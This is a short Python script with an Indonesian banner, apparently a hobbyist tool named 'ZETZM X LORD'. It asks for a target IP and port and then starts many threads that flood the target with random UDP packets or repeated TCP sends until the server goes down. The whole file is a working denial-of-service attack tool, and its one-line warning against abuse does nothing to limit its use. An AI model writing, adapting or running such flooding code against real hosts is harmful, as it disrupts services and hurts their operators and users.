import random
import socket
import threading

print       (" ============================= ")
print       (" [•] AUTHOR  : HAMM")
print       (" [•] PROJECT : ZETZM X LORD ")                                   
print       (" [•] SINCE   : 15-12-2021 ")
print       ("=============================  ")
print       (" DILARANG UNTUK ABUSE MENGGUNAKAN TOOLS INI! ")
print       ( " COPYRIGHT BY ZETZM X LORD ©2021 " )
    
ip = str(input("  IP:"))
port = int(input(" PORT:"))
choice = str(input(" MAU NYERANG? (y/n):"))
times = int(input(" PAKET :"))
threads = int(input(" PELURU :"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" SEND PAKET ")
		except:
			print(" SERVER DOWN ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" SEND PAKET ")
		except:
			s.close()
			print(" SERVER DOWN ")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()